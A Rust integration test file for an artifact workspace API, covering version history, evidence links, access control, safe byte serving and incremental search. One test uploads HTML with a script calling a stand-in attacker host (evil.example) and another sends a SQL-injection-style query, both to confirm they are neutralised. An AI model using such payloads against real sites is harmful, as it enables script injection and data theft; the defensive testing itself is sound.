//! APP-008: the artifact workspace's projections — artifacts outlive their runs, version
//! history with produced-by and evidence links, digest-verified bytes served as an
//! attachment with `nosniff` (never a document), and the typed `/v1/search` across
//! artifacts, threads, knowledge and evidence, with INT-004's index for content.
//!
//! Runs against a scratch database and the dev MinIO (blocked, not skipped, without
//! them); the search index lives in a temporary directory.

use std::sync::Arc;

use axum::http::Request;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
use quansio_server::api::ApiState;
use quansio_server::artifacts::{
    CapturedBy, EvidenceContent, EvidenceKind, EvidenceStore, NewEvidence, ObjectStore,
    S3ObjectStore,
};
use quansio_server::control::schema;
use serde_json::{json, Value};
use tower::ServiceExt;

mod common;

const TENANT: &str = "tn_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ";
const USER: &str = "usr_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ";
const OTHER_USER: &str = "usr_01J8Z3K6F1N8VQ2X5W9Y0JJJJK";
const WORKSPACE: &str = "ws_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ";
const NODE: &str = "wn_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ";

fn command_id(n: u32) -> String {
    format!("cmd_01J8Z3K6F1N8VQ2X5W9Y0J{n:04}")
}

struct Harness {
    router: axum::Router,
    pool: sqlx::PgPool,
    name: String,
    objects: Arc<dyn ObjectStore>,
    _index_root: tempfile::TempDir,
}

async fn prepare(prefix: &str) -> Option<Harness> {
    let name = common::scratch_name(prefix);
    let pool = common::fresh_database(&name).await?;
    schema::migrate(&pool).await.expect("migrate");
    common::seed_tenant(&pool, TENANT, USER, WORKSPACE, NODE).await;
    seed_policy(&pool).await;
    let objects: Arc<dyn ObjectStore> =
        Arc::new(S3ObjectStore::from_env().expect("QUANSIO_TEST_MINIO_* configuration"));
    let index_root = tempfile::tempdir().expect("index root");
    let index = quansio_indexer::SearchIndex::open(index_root.path()).expect("index");
    let state = ApiState::new(pool.clone())
        .expect("api")
        .with_object_store(objects.clone())
        .with_search_index(Arc::new(index));
    Some(Harness {
        router: quansio_server::api::router(state),
        pool,
        name,
        objects,
        _index_root: index_root,
    })
}

async fn seed_policy(pool: &sqlx::PgPool) {
    let rules = json!([
        { "effect_class": "read.internal", "resource": { "kind": "fs", "selector": "**" }, "decision": "allow" }
    ]);
    let mut tx = pool.begin().await.expect("begin");
    schema::set_tenant_context(&mut tx, TENANT)
        .await
        .expect("tenant");
    sqlx::query(
        "INSERT INTO policies (id, tenant_id, workspace_id, scope, rules) \
         VALUES ('pol_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ', $1, NULL, 'tenant', $2)",
    )
    .bind(TENANT)
    .bind(rules)
    .execute(&mut *tx)
    .await
    .expect("policy");
    tx.commit().await.expect("commit");
}

fn http(method: &str, path: &str, user: &str, body: Option<Value>) -> Request<axum::body::Body> {
    let builder = Request::builder()
        .method(method)
        .uri(path)
        .header("x-quansio-tenant", TENANT)
        .header("x-quansio-user", user);
    match body {
        Some(body) => builder
            .header("content-type", "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .expect("request"),
        None => builder.body(axum::body::Body::empty()).expect("request"),
    }
}

async fn json_body(response: axum::response::Response) -> Value {
    let bytes = axum::body::to_bytes(response.into_body(), 1 << 24)
        .await
        .expect("body");
    serde_json::from_slice(&bytes).expect("json")
}

async fn command(router: &axum::Router, name: &str, id: u32, params: Value) -> (u16, Value) {
    let response = router
        .clone()
        .oneshot(http(
            "POST",
            &format!("/v1/commands/{name}"),
            USER,
            Some(json!({ "command_id": command_id(id), "params": params })),
        ))
        .await
        .expect("response");
    let status = response.status().as_u16();
    (status, json_body(response).await)
}

async fn get(router: &axum::Router, path: &str) -> Value {
    let response = router
        .clone()
        .oneshot(http("GET", path, USER, None))
        .await
        .expect("response");
    json_body(response).await
}

async fn upload(
    router: &axum::Router,
    id: u32,
    title: &str,
    media_type: &str,
    bytes: &[u8],
    artifact_id: Option<&str>,
) -> Value {
    let mut params = json!({
        "workspace_id": WORKSPACE,
        "title": title,
        "media_type": media_type,
        "bytes_base64": STANDARD.encode(bytes),
    });
    if let Some(existing) = artifact_id {
        params["artifact_id"] = json!(existing);
    }
    let (status, body) = command(router, "CreateArtifact", id, params).await;
    assert_eq!(status, 200, "{body}");
    body["result"].clone()
}

#[tokio::test]
async fn artifacts_outlive_the_run_and_keep_their_version_history_with_links() {
    let Some(h) = prepare("aw_persist").await else {
        common::blocked_marker();
        return;
    };
    // A run produces work and then ends (cancelled here; the ledger's terminal states are
    // all the same to the artifact): the artifact created on the way stays.
    let (status, posted) = command(
        &h.router,
        "PostMessage",
        1,
        json!({ "workspace_id": WORKSPACE, "content": "make a report [[scenario:question]]" }),
    )
    .await;
    assert_eq!(status, 200, "{posted}");
    let run_id = posted["result"]["run_id"]
        .as_str()
        .expect("run")
        .to_string();
    let first = upload(
        &h.router,
        2,
        "report.md",
        "text/markdown",
        b"# Report\n\nfirst draft with alpha findings\n",
        None,
    )
    .await;
    let artifact_id = first["artifact_id"].as_str().expect("artifact").to_string();
    let (status, cancelled) =
        command(&h.router, "CancelTurn", 3, json!({ "run_id": run_id })).await;
    assert_eq!(status, 200, "{cancelled}");
    assert_eq!(
        get(&h.router, &format!("/v1/runs/{run_id}")).await["status"],
        "CANCELLED"
    );

    let listed = get(
        &h.router,
        &format!("/v1/artifacts?workspace_id={WORKSPACE}"),
    )
    .await;
    let row = listed["artifacts"]
        .as_array()
        .expect("artifacts")
        .iter()
        .find(|a| a["id"] == artifact_id)
        .cloned()
        .expect("artifact listed after the run closed");
    assert_eq!(row["kind"], "document", "{row}");
    assert_eq!(row["version_count"], 1, "{row}");
    assert_eq!(row["produced_by"]["user_id"], USER, "{row}");
    assert_eq!(row["origin"]["kind"], "upload", "{row}");

    // A second version by the same principal; the history keeps both, in order.
    let second = upload(
        &h.router,
        4,
        "report.md",
        "text/markdown",
        b"# Report\n\nsecond draft with beta findings\n",
        Some(&artifact_id),
    )
    .await;
    assert_eq!(second["artifact_id"], artifact_id, "{second}");
    assert_eq!(second["seq"], 2, "{second}");
    // A replay of the same bytes is the same version, not a third.
    let replay = upload(
        &h.router,
        5,
        "report.md",
        "text/markdown",
        b"# Report\n\nsecond draft with beta findings\n",
        Some(&artifact_id),
    )
    .await;
    assert_eq!(replay["version_id"], second["version_id"], "{replay}");
    assert_eq!(replay["replayed"], true, "{replay}");

    // Evidence captured by a step links to the version that step produced.
    let mut conn = h.pool.acquire().await.expect("conn");
    let evidence = EvidenceStore::new(h.objects.as_ref())
        .record(
            &mut conn,
            TENANT,
            &NewEvidence {
                workspace_id: WORKSPACE.to_string(),
                run_id: Some(run_id.clone()),
                step_id: None,
                effect_id: None,
                kind: EvidenceKind::ToolOutput,
                content: EvidenceContent::Bytes {
                    bytes: b"grep output: alpha findings".to_vec(),
                    media_type: "text/plain".to_string(),
                },
                inline_summary: Some("grep found the alpha findings".to_string()),
                captured_at: None,
                captured_by: CapturedBy {
                    kind: "run".to_string(),
                    id: run_id.clone(),
                },
                redaction_applied: false,
            },
        )
        .await
        .expect("evidence");
    let evidence_id = evidence.id.to_canonical();
    let fetched = get(&h.router, &format!("/v1/evidence/{evidence_id}")).await;
    assert_eq!(fetched["id"], evidence_id, "{fetched}");
    assert_eq!(fetched["run_id"], run_id, "{fetched}");
    assert_eq!(fetched["kind"], "tool_output", "{fetched}");
    assert_eq!(fetched["has_bytes"], true, "{fetched}");

    let history = get(&h.router, &format!("/v1/artifacts/{artifact_id}/versions")).await;
    assert_eq!(history["artifact"]["id"], artifact_id, "{history}");
    assert_eq!(
        history["artifact"]["current_version_id"], second["version_id"],
        "{history}"
    );
    let versions = history["versions"].as_array().expect("versions");
    assert_eq!(
        versions
            .iter()
            .map(|v| v["seq"].as_i64())
            .collect::<Vec<_>>(),
        vec![Some(1), Some(2)],
        "{history}"
    );
    assert_eq!(versions[0]["produced_by"]["user_id"], USER, "{history}");
    assert_eq!(
        versions[1]["parent_version_id"], first["version_id"],
        "{history}"
    );
    assert!(versions[1]["evidence_ids"].is_array(), "{history}");

    // Filtering by kind and by run stays typed.
    let documents = get(
        &h.router,
        &format!("/v1/artifacts?workspace_id={WORKSPACE}&kind=document"),
    )
    .await;
    assert_eq!(
        documents["artifacts"].as_array().map(Vec::len),
        Some(1),
        "{documents}"
    );
    let images = get(
        &h.router,
        &format!("/v1/artifacts?workspace_id={WORKSPACE}&kind=image"),
    )
    .await;
    assert_eq!(
        images["artifacts"].as_array().map(Vec::len),
        Some(0),
        "{images}"
    );
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!("/v1/artifacts?workspace_id={WORKSPACE}&kind=virus"),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(response.status().as_u16(), 400);

    common::drop_pool(&h.pool, &h.name).await;
}

#[tokio::test]
async fn bytes_are_served_as_an_attachment_never_as_a_document_and_only_to_a_reader() {
    let Some(h) = prepare("aw_bytes").await else {
        common::blocked_marker();
        return;
    };
    let html = b"<!doctype html><html><body><script>fetch('http://evil.example/x')</script>hi</body></html>";
    let created = upload(&h.router, 1, "page.html", "text/html", html, None).await;
    let artifact_id = created["artifact_id"]
        .as_str()
        .expect("artifact")
        .to_string();
    let version_id = created["version_id"].as_str().expect("version").to_string();

    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!("/v1/artifacts/{artifact_id}/versions/{version_id}/content"),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(response.status().as_u16(), 200);
    let headers = response.headers().clone();
    // Active content comes back labelled as plain text, as an attachment, with nosniff:
    // nothing in the response invites a client to render it.
    assert_eq!(
        headers.get("content-type").and_then(|v| v.to_str().ok()),
        Some("text/plain; charset=utf-8"),
        "{headers:?}"
    );
    assert!(
        headers
            .get("content-disposition")
            .and_then(|v| v.to_str().ok())
            .is_some_and(|v| v.starts_with("attachment;")),
        "{headers:?}"
    );
    assert_eq!(
        headers
            .get("x-content-type-options")
            .and_then(|v| v.to_str().ok()),
        Some("nosniff"),
        "{headers:?}"
    );
    assert_eq!(
        headers.get("cache-control").and_then(|v| v.to_str().ok()),
        Some("private, no-store"),
        "{headers:?}"
    );
    let bytes = axum::body::to_bytes(response.into_body(), 1 << 24)
        .await
        .expect("body");
    assert_eq!(
        bytes.as_ref(),
        html,
        "the bytes are exact: the digest is verified on the way out"
    );

    // A binary image keeps its media type (the desktop shows raster images in-process only).
    let png: Vec<u8> = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]
        .into_iter()
        .chain((0..=255u8).cycle().take(2000))
        .collect();
    let image = upload(&h.router, 2, "chart.png", "image/png", &png, None).await;
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!(
                "/v1/artifacts/{}/versions/{}/content",
                image["artifact_id"].as_str().unwrap(),
                image["version_id"].as_str().unwrap()
            ),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(
        response
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok()),
        Some("image/png")
    );
    let bytes = axum::body::to_bytes(response.into_body(), 1 << 24)
        .await
        .expect("body");
    assert_eq!(bytes.as_ref(), png.as_slice());

    // Another user of the tenant without a grant cannot read the bytes (CORE-007's rule).
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!("/v1/artifacts/{artifact_id}/versions/{version_id}/content"),
            OTHER_USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(
        response.status().as_u16(),
        403,
        "{}",
        json_body(response).await
    );

    // A version of another artifact is not reachable through this artifact's path.
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!(
                "/v1/artifacts/{}/versions/{version_id}/content",
                image["artifact_id"].as_str().unwrap()
            ),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(response.status().as_u16(), 404);

    common::drop_pool(&h.pool, &h.name).await;
}

#[tokio::test]
async fn search_is_one_typed_program_across_artifacts_threads_knowledge_and_evidence() {
    let Some(h) = prepare("aw_search").await else {
        common::blocked_marker();
        return;
    };
    // Content the index must find (not the title), a title-only match, a message, a
    // knowledge entry and an evidence row, all sharing the word "quokka".
    let doc = upload(
        &h.router,
        1,
        "notes.md",
        "text/markdown",
        b"# Field notes\n\nThe quokka population on the island doubled.\n",
        None,
    )
    .await;
    let titled = upload(
        &h.router,
        2,
        "quokka-census.csv",
        "text/csv",
        b"year,count\n2025,12\n",
        None,
    )
    .await;
    let unrelated = upload(
        &h.router,
        3,
        "budget.csv",
        "text/csv",
        b"item,cost\npens,3\n",
        None,
    )
    .await;
    let (status, posted) = command(
        &h.router,
        "PostMessage",
        4,
        json!({ "workspace_id": WORKSPACE, "content": "did the quokka count change?" }),
    )
    .await;
    assert_eq!(status, 200, "{posted}");
    let thread_id = posted["result"]["thread_id"]
        .as_str()
        .expect("thread")
        .to_string();
    let run_id = posted["result"]["run_id"]
        .as_str()
        .expect("run")
        .to_string();
    {
        let mut tx = h.pool.begin().await.expect("begin");
        schema::set_tenant_context(&mut tx, TENANT)
            .await
            .expect("tenant");
        sqlx::query(
            "INSERT INTO knowledge_entries (id, tenant_id, workspace_id, scope, kind, content_ref, content, status) \
             VALUES ('kn_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ', $1, $2, 'workspace', 'fact', 'wildlife/quokka', '{\"text\": \"quokkas are marsupials\"}'::jsonb, 'active'), \
                    ('kn_01J8Z3K6F1N8VQ2X5W9Y0JJJJK', $1, $2, 'workspace', 'fact', 'wildlife/quokka-draft', '{\"text\": \"unverified quokka claim\"}'::jsonb, 'candidate')",
        )
        .bind(TENANT)
        .bind(WORKSPACE)
        .execute(&mut *tx)
        .await
        .expect("knowledge");
        tx.commit().await.expect("commit");
    }
    let mut conn = h.pool.acquire().await.expect("conn");
    let evidence = EvidenceStore::new(h.objects.as_ref())
        .record(
            &mut conn,
            TENANT,
            &NewEvidence {
                workspace_id: WORKSPACE.to_string(),
                run_id: Some(run_id.clone()),
                step_id: None,
                effect_id: None,
                kind: EvidenceKind::Log,
                content: EvidenceContent::Bytes {
                    bytes: b"counted 24 quokkas".to_vec(),
                    media_type: "text/plain".to_string(),
                },
                inline_summary: Some("quokka count log".to_string()),
                captured_at: None,
                captured_by: CapturedBy {
                    kind: "run".to_string(),
                    id: run_id.clone(),
                },
                redaction_applied: false,
            },
        )
        .await
        .expect("evidence");

    let found = get(
        &h.router,
        &format!("/v1/search?workspace_id={WORKSPACE}&q=quokka"),
    )
    .await;
    assert_eq!(
        found["program"]["channels"],
        json!(["artifacts", "threads", "knowledge", "evidence"]),
        "{found}"
    );
    assert!(
        found["engines"]
            .as_array()
            .unwrap()
            .iter()
            .any(|e| e["engine"] == "quansio-indexer"),
        "{found}"
    );
    let hits = found["hits"].as_array().expect("hits");
    let ids: Vec<&str> = hits.iter().filter_map(|hit| hit["id"].as_str()).collect();
    assert!(
        ids.contains(&doc["artifact_id"].as_str().unwrap()),
        "content hit through the index: {found}"
    );
    assert!(
        ids.contains(&titled["artifact_id"].as_str().unwrap()),
        "title hit: {found}"
    );
    assert!(
        !ids.contains(&unrelated["artifact_id"].as_str().unwrap()),
        "{found}"
    );
    assert!(
        ids.contains(&posted["result"]["message_id"].as_str().unwrap()),
        "message hit: {found}"
    );
    assert!(
        ids.contains(&"kn_01J8Z3K6F1N8VQ2X5W9Y0JJJJJ"),
        "active knowledge hit: {found}"
    );
    assert!(
        !ids.contains(&"kn_01J8Z3K6F1N8VQ2X5W9Y0JJJJK"),
        "a candidate entry is not knowledge yet: {found}"
    );
    assert!(
        ids.contains(&evidence.id.to_canonical().as_str()),
        "evidence hit: {found}"
    );
    let content_hit = hits
        .iter()
        .find(|hit| hit["id"] == doc["artifact_id"])
        .expect("content hit");
    assert_eq!(content_hit["matched"], "content", "{content_hit}");
    assert!(
        content_hit["snippet"]
            .as_str()
            .unwrap()
            .to_lowercase()
            .contains("quokka"),
        "{content_hit}"
    );
    assert_eq!(
        content_hit["provenance"]["source_id"], doc["artifact_id"],
        "{content_hit}"
    );
    assert!(
        content_hit["provenance"]["locator"]
            .as_str()
            .unwrap()
            .starts_with("artifact_version:"),
        "{content_hit}"
    );
    let message_hit = hits
        .iter()
        .find(|hit| hit["channel"] == "threads")
        .expect("message hit");
    assert_eq!(message_hit["ref"]["thread_id"], thread_id, "{message_hit}");

    // Channels are an enumeration and the budget is bounded; the query is data.
    let only = get(&h.router, &format!("/v1/search?workspace_id={WORKSPACE}&q=quokka&channels=evidence,knowledge&max_results=1")).await;
    assert_eq!(
        only["program"]["channels"],
        json!(["evidence", "knowledge"]),
        "{only}"
    );
    assert!(
        only["hits"]
            .as_array()
            .unwrap()
            .iter()
            .all(|hit| hit["channel"] == "evidence" || hit["channel"] == "knowledge"),
        "{only}"
    );
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!("/v1/search?workspace_id={WORKSPACE}&q=quokka&channels=memory"),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(response.status().as_u16(), 400);
    let response = h
        .router
        .clone()
        .oneshot(http(
            "GET",
            &format!("/v1/search?workspace_id={WORKSPACE}&q=quokka&max_results=500"),
            USER,
            None,
        ))
        .await
        .expect("response");
    assert_eq!(response.status().as_u16(), 400);
    let injected = get(&h.router, &format!("/v1/search?workspace_id={WORKSPACE}&q=%25%27%20OR%201%3D1%20--&channels=threads,evidence")).await;
    assert_eq!(
        injected["hits"].as_array().map(Vec::len),
        Some(0),
        "LIKE metacharacters and quotes are data: {injected}"
    );

    // A new version changes the corpus; the index follows without a restart.
    let updated = upload(
        &h.router,
        5,
        "notes.md",
        "text/markdown",
        b"# Field notes\n\nThe numbat population on the island doubled.\n",
        Some(doc["artifact_id"].as_str().unwrap()),
    )
    .await;
    assert_eq!(updated["seq"], 2, "{updated}");
    let numbat = get(
        &h.router,
        &format!("/v1/search?workspace_id={WORKSPACE}&q=numbat&channels=artifacts"),
    )
    .await;
    assert!(
        numbat["hits"]
            .as_array()
            .unwrap()
            .iter()
            .any(|hit| hit["id"] == doc["artifact_id"] && hit["matched"] == "content"),
        "{numbat}"
    );

    common::drop_pool(&h.pool, &h.name).await;
}

/// The object store, counting reads: how much of the corpus a search had to read back.
struct CountingStore {
    inner: Arc<dyn ObjectStore>,
    reads: std::sync::atomic::AtomicUsize,
}

#[async_trait::async_trait]
impl ObjectStore for CountingStore {
    async fn put(
        &self,
        key: &quansio_server::artifacts::ObjectKey,
        bytes: &[u8],
        content_type: &str,
    ) -> Result<(), quansio_server::artifacts::ObjectStoreError> {
        self.inner.put(key, bytes, content_type).await
    }
    async fn get(
        &self,
        key: &quansio_server::artifacts::ObjectKey,
    ) -> Result<Vec<u8>, quansio_server::artifacts::ObjectStoreError> {
        self.reads.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        self.inner.get(key).await
    }
    async fn exists(
        &self,
        key: &quansio_server::artifacts::ObjectKey,
    ) -> Result<bool, quansio_server::artifacts::ObjectStoreError> {
        self.inner.exists(key).await
    }
    async fn delete(
        &self,
        key: &quansio_server::artifacts::ObjectKey,
    ) -> Result<(), quansio_server::artifacts::ObjectStoreError> {
        self.inner.delete(key).await
    }
}

#[tokio::test]
async fn search_indexes_only_what_arrived_since_it_last_looked() {
    let name = common::scratch_name("aw_incremental");
    let Some(pool) = common::fresh_database(&name).await else {
        common::blocked_marker();
        return;
    };
    schema::migrate(&pool).await.expect("migrate");
    common::seed_tenant(&pool, TENANT, USER, WORKSPACE, NODE).await;
    seed_policy(&pool).await;
    let counting = Arc::new(CountingStore {
        inner: Arc::new(S3ObjectStore::from_env().expect("QUANSIO_TEST_MINIO_* configuration")),
        reads: std::sync::atomic::AtomicUsize::new(0),
    });
    let index_root = tempfile::tempdir().expect("index root");
    let index = quansio_indexer::SearchIndex::open(index_root.path()).expect("index");
    let state = ApiState::new(pool.clone())
        .expect("api")
        .with_object_store(counting.clone() as Arc<dyn ObjectStore>)
        .with_search_index(Arc::new(index));
    let router = quansio_server::api::router(state);
    let reads = || counting.reads.load(std::sync::atomic::Ordering::SeqCst);

    for id in 0..6u32 {
        upload(
            &router,
            100 + id,
            &format!("note-{id}.md"),
            "text/markdown",
            format!("wombat note {id}").as_bytes(),
            None,
        )
        .await;
    }
    // The first search builds the tenant's index from the whole corpus.
    let before = reads();
    let found = get(
        &router,
        &format!("/v1/search?workspace_id={WORKSPACE}&q=wombat&channels=artifacts"),
    )
    .await;
    assert!(found.to_string().contains("note-5.md"), "{found}");
    assert!(reads() - before >= 6, "the first look reads the corpus");

    // One more artifact: the next search reads that one version, not the corpus again.
    upload(
        &router,
        200,
        "fresh.md",
        "text/markdown",
        b"wombat freshly written",
        None,
    )
    .await;
    let before = reads();
    let found = get(
        &router,
        &format!("/v1/search?workspace_id={WORKSPACE}&q=freshly&channels=artifacts"),
    )
    .await;
    assert!(found.to_string().contains("fresh.md"), "{found}");
    assert_eq!(reads() - before, 1, "only the new version is read");

    // Nothing new: nothing is read at all.
    let before = reads();
    get(
        &router,
        &format!("/v1/search?workspace_id={WORKSPACE}&q=wombat&channels=artifacts"),
    )
    .await;
    assert_eq!(reads() - before, 0);

    common::drop_pool(&pool, &name).await;
}
